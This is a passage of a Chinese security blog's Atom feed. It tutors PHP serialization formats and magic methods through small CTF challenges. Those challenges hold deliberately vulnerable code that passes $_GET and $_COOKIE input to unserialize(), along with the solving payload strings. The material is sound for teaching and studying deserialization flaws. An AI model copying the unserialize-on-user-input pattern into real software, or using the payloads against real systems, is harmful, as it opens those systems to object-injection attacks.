<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>忆 执 昔 来 的 旅 途</title>
  
  
  <link href="https://xizhi-future.github.io/atom.xml" rel="self"/>
  
  <link href="https://xizhi-future.github.io/"/>
  <updated>2021-10-07T10:11:19.031Z</updated>
  <id>https://xizhi-future.github.io/</id>
  
  <author>
    <name>xizhi-future</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>序列化与反序列化</title>
    <link href="https://xizhi-future.github.io/2021/10/07/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://xizhi-future.github.io/2021/10/07/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2021-10-07T10:10:26.000Z</published>
    <updated>2021-10-07T10:11:19.031Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h1><blockquote><p>序列化：持久保存，网络传输</p><p>序列化是将对象状态转换为可保持或可传输的格式的过程（对象转换为字符串）。与序列化相对的是反序列化，它将流转换为对象（字符串转换为对象）。这两个过程结合起来，可以轻松地存储和传输数据</p><p>本质上就是对于数据格式的一种转换</p></blockquote><p><strong>常见的序列化格式：</strong></p><ul><li>二进制格式</li><li>字节数组</li><li>json 字符串</li><li>xml 字符串</li></ul><p><img src="https://i.loli.net/2021/09/15/IWPycor6sQ9nYL7.png" alt="image-20210504114814092"></p><p>理解：在程序执行结束时，内存数据便会立即销毁，变量所储存的数据便是内存数据，而文件、数据库是“持久数据”，因此<strong>PHP序列化就是将内存的变量数据“保存”到文件中的持久数据的过程。</strong></p><h1 id="一、-PHP-反序列化"><a href="#一、-PHP-反序列化" class="headerlink" title="一、 PHP 反序列化"></a>一、 PHP 反序列化</h1><h2 id="1-1-格式"><a href="#1-1-格式" class="headerlink" title="1.1 格式"></a>1.1 格式</h2><p>原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码注入，SQL注入等危害。</p><p>当进行反序列化的过程中就会自动触发某些魔术方法。</p><p><strong>涉及函数：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">serialize()<span class="comment">//序列化：将一个对象转换为一个字符串</span></span><br><span class="line">unserialize()<span class="comment">//反序列化：将一个字符串还原为一个对象</span></span><br></pre></td></tr></table></figure><p><strong>示例：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="string">&quot;qww&quot;</span>;</span><br><span class="line"><span class="comment">//$test = 123;</span></span><br><span class="line"><span class="comment">//$test = true;</span></span><br><span class="line"><span class="variable">$test</span> = serialize(<span class="variable">$test</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//s:3:&quot;qww&quot;;</span></span><br><span class="line"><span class="comment">//i:123;    </span></span><br><span class="line"><span class="comment">//b:1;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="string">&#x27;s:3:&quot;qww&quot;;&#x27;</span>;</span><br><span class="line"><span class="variable">$test</span> = unserialize(<span class="variable">$test</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//qww </span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$user</span>=array(<span class="string">&#x27;xiao&#x27;</span>,<span class="string">&#x27;shi&#x27;</span>,<span class="string">&#x27;zi&#x27;</span>);</span><br><span class="line"><span class="variable">$user</span>=serialize(<span class="variable">$user</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$user</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">print_r(unserialize(<span class="variable">$user</span>));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/10/qVYPWyw4pl1ITsJ.png" alt="image-20210910165634478"></p><p><strong>格式：</strong></p><p><img src="https://i.loli.net/2021/09/15/3JxYcWU6D2tlKOn.png" alt="image-20210504120450323"></p><p><strong>序列化与反序列化 字母表示：</strong></p><table><thead><tr><th align="center">a</th><th align="center">array数组</th></tr></thead><tbody><tr><td align="center">b</td><td align="center">boolean判断类型</td></tr><tr><td align="center">d</td><td align="center">double浮点数</td></tr><tr><td align="center">i</td><td align="center">integer整数型</td></tr><tr><td align="center">o</td><td align="center">common object 一般的对象</td></tr><tr><td align="center">r</td><td align="center">reference引用类型</td></tr><tr><td align="center">s</td><td align="center">string字符串类型</td></tr><tr><td align="center">C</td><td align="center">custom object</td></tr><tr><td align="center">O</td><td align="center">class</td></tr><tr><td align="center">N</td><td align="center">null</td></tr><tr><td align="center">R</td><td align="center">pointer reference</td></tr><tr><td align="center">U</td><td align="center">unicode string</td></tr></tbody></table><h2 id="1-2-特性"><a href="#1-2-特性" class="headerlink" title="1.2 特性"></a>1.2 特性</h2><ul><li><p><strong>所有 php 中的值都可以使用 serialize()  来返回一个包含字节流的字符串表示</strong></p></li><li><p><strong>序列化之后的内容只有成员变量，没有成员函数，即方法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class <span class="built_in">test</span>&#123;</span><br><span class="line">    public <span class="variable">$a</span>;</span><br><span class="line">    public <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;<span class="variable">$this</span>-&gt;a = <span class="string">&quot;xiaoshizi&quot;</span>;<span class="variable">$this</span>-&gt;b=<span class="string">&quot;laoshizi&quot;</span>;&#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">happy</span></span>()&#123;<span class="built_in">return</span> <span class="variable">$this</span>-&gt;a;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = new <span class="built_in">test</span>();</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/10/NS5xRa8hUD7rvXI.png" alt="image-20210910170119999"></p></li><li><p><strong>三种变量类型的差异：</strong></p><p>变量前是 <strong>protected</strong>，则会在变量名前加上<code>\x00*\x00</code> , <strong>private</strong> 则会在变量名前加上<code>\x00类名\x00</code>，<code>\x00字段名\x00</code>，输出时一般需要url编码，若在本地存储推荐采用base64编码的形式。</p><ul><li><p><strong>public  正常输出</strong></p></li><li><p><strong>Private 所声明的私有变量</strong> 只能在所声明的类中可见，在该类的子类以及该类的对象中均不可见。所以私有变量在序列化时，类名和字段名前面都会加上 <code>%00</code> ，即 ascii 为0的字符（不可见字符）；</p></li><li><p><strong>Protected 所声明受保护类型的变量</strong> 序列化时会有 <code>%00*%00</code> 字符；</p></li></ul><p><strong>测试一：public</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$flag_1</span> = (serialize(<span class="variable">$flag</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag_1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#返回</span></span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;op&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;2&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><p><strong>测试二：private</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$op</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$flag_1</span> = (serialize(<span class="variable">$flag</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag_1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#返回</span></span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">15</span>:<span class="string">&quot;FileHandlerop&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;2&quot;</span>;s:<span class="number">21</span>:<span class="string">&quot;FileHandlerfilename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;FileHandlercontent&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#实际上是</span></span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">15</span>:<span class="string">&quot;%00FileHandler%00op&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;2&quot;</span>;s:<span class="number">21</span>:<span class="string">&quot;%00FileHandler%00filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;%00FileHandler%00content&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><p><strong>测试三：protected</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$flag_1</span> = (serialize(<span class="variable">$flag</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag_1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#返回</span></span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;*op&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;2&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;*filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;*content&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><p>实际上是输出导致了不可见字符 <code>\x00</code> 的丢失</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#实际上是</span></span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;%00*%00op&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;2&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;%00*%00filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;%00*%00content&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="1-3-php-反序列化的触发"><a href="#1-3-php-反序列化的触发" class="headerlink" title="1.3 php 反序列化的触发"></a>1.3 php 反序列化的触发</h2><p><strong>触发条件：</strong></p><p>unserialize() 函数 的变量可控，文件当中存在可利用的类，类中存在魔术方法</p><p><strong>常见魔术方法：魔术方法就是 php 在进行有关类中变量序列化以及反序列化相关操作是会自动被调用的一些方法（函数）</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() <span class="comment">//使用unserialize时触发 </span></span><br><span class="line">__sleep() <span class="comment">//使用serialize时触发 </span></span><br><span class="line">__destruct() <span class="comment">//对象被销毁时触发</span></span><br><span class="line">__call()    <span class="comment">//在对象上下文中调用不可访问的方法时触发——对象调用一个没有声明的方法时，触发 </span></span><br><span class="line">__callStatic() <span class="comment">//在静态上下文中调用不可访问的方法时触发 </span></span><br><span class="line">__get() <span class="comment">//用于从不可访问的属性读取数据 </span></span><br><span class="line">__set() <span class="comment">//用于将数据写入不可访问的属性 </span></span><br><span class="line">__isset() <span class="comment">//在不可访问的属性上调用isset()或empty()触发 </span></span><br><span class="line">__unset() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line">__toString() <span class="comment">//把 一个对象 当作 字符串 使用时触发 </span></span><br><span class="line">    <span class="comment">//例如：echo 对象; $text=$test+$对象； </span></span><br><span class="line">__invoke() <span class="comment">//当尝试以调用函数的方式调用一个对象时，该方法会被自动调用</span></span><br></pre></td></tr></table></figure><p><a href="https://www.php.net/manual/zh/language.oop5.magic.php">其它魔术方法</a></p><p>理解魔术方法的调用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr1</span>=<span class="string">&quot;abc&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr2</span>=<span class="string">&quot;123&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">echoP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;varr1.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;__construct&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;__destruct&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;__toString&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;__sleep&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;varr1&#x27;</span>,<span class="string">&#x27;varr2&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;__wakeup&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> test();  <span class="comment">//实例化对象，调用__construct()方法，输出__construct</span></span><br><span class="line"><span class="variable">$obj</span>-&gt;echoP();   <span class="comment">//调用echoP()方法，输出&quot;abc&quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>;    <span class="comment">//obj对象被当做字符串输出，调用__toString()方法，输出__toString</span></span><br><span class="line"><span class="variable">$s</span> =serialize(<span class="variable">$obj</span>);  <span class="comment">//obj对象被序列化，调用__sleep()方法，输出__sleep</span></span><br><span class="line"><span class="keyword">echo</span> unserialize(<span class="variable">$s</span>);  <span class="comment">//$s首先会被反序列化，会调用__wake()方法，被反序列化出来的对象又被当做字符串，就会调用_toString()方法。</span></span><br><span class="line"><span class="comment">// 脚本结束又会调用__destruct()方法，输出__destruct</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/10/g1OCJhFiYa7s8yk.png" alt="image-20210910213239299"></p><h2 id="1-4-无类简单题目"><a href="#1-4-无类简单题目" class="headerlink" title="1.4 无类简单题目"></a>1.4 无类简单题目</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;Love&quot;</span>;</span><br><span class="line">    <span class="variable">$str1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;str1&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(unserialize(<span class="variable">$str1</span>) === <span class="variable">$str</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//WP:?str1=s:4:&quot;Love&quot;;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;ISecer&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hint&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(unserialize(<span class="variable">$cookie</span>) === <span class="string">&quot;<span class="subst">$KEY</span>&quot;</span>)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;admin.css&quot;</span> type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">align</span>=&quot;<span class="title">center</span>&quot;&gt;</span></span><br><span class="line"><span class="class">  &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">action</span>=&quot;#&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;&lt;<span class="title">input</span> <span class="title">name</span>=&quot;<span class="title">user</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Username</span>&quot;&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;&lt;<span class="title">input</span> <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Password</span>&quot;&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;&lt;<span class="title">input</span> <span class="title">value</span>=&quot;<span class="title">Login</span>&quot; <span class="title">type</span>=&quot;<span class="title">button</span>&quot;/&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">$<span class="title">KEY</span>=&#x27;<span class="title">ISecer</span>:<span class="title">www</span>.<span class="title">isecer</span>.<span class="title">com</span>&#x27;;</span></span><br><span class="line"><span class="class">?&gt; </span></span><br><span class="line"><span class="class">//<span class="title">WP</span>:<span class="title">cookie</span>:<span class="title">ISecer</span>=<span class="title">s</span>:0:&quot;&quot;;</span></span><br><span class="line"><span class="class">    //顺序问题</span></span><br></pre></td></tr></table></figure><h2 id="1-5-有类简单题目"><a href="#1-5-有类简单题目" class="headerlink" title="1.5 有类简单题目"></a>1.5 有类简单题目</h2><p>触发魔术方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__construct <span class="comment">//创建对象时触发</span></span><br><span class="line">__destruct <span class="comment">//对象被销毁时 触发 使用unserialize时触发</span></span><br><span class="line">__toString <span class="comment">//echo 或者 拼接字符串或者其它隐式调用该方法的操作都会被触发</span></span><br><span class="line">__wakeup() <span class="comment">//使用unserialize时触发 </span></span><br><span class="line">__sleep() <span class="comment">//使用serialize时触发 </span></span><br><span class="line">__call()    <span class="comment">//在对象上下文中调用不可访问的方法时触发——对象调用一个没有声明的方法时，触发 </span></span><br><span class="line">__callStatic() <span class="comment">//在静态上下文中调用不可访问的方法时触发 </span></span><br><span class="line">__get() <span class="comment">//用于从不可访问的属性读取数据 </span></span><br><span class="line">__set() <span class="comment">//用于将数据写入不可访问的属性 </span></span><br><span class="line">__isset() <span class="comment">//在不可访问的属性上调用isset()或empty()触发 </span></span><br><span class="line">__unset() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line">__toString() <span class="comment">//把类当作字符串使用时触发 echo 对象; $text=$test+$对象； </span></span><br><span class="line">__invoke() <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure><p>魔术方法参考：<a href="https://www.cnblogs.com/20175211lyz/p/11403397.html">https://www.cnblogs.com/20175211lyz/p/11403397.html</a></p><h2 id="1-5-CTF-题目"><a href="#1-5-CTF-题目" class="headerlink" title="1.5 CTF 题目"></a>1.5 CTF 题目</h2><h3 id="1-5-1-CTFHUB-AreUSerialz"><a href="#1-5-1-CTFHUB-AreUSerialz" class="headerlink" title="1.5.1 CTFHUB AreUSerialz"></a>1.5.1 CTFHUB AreUSerialz</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 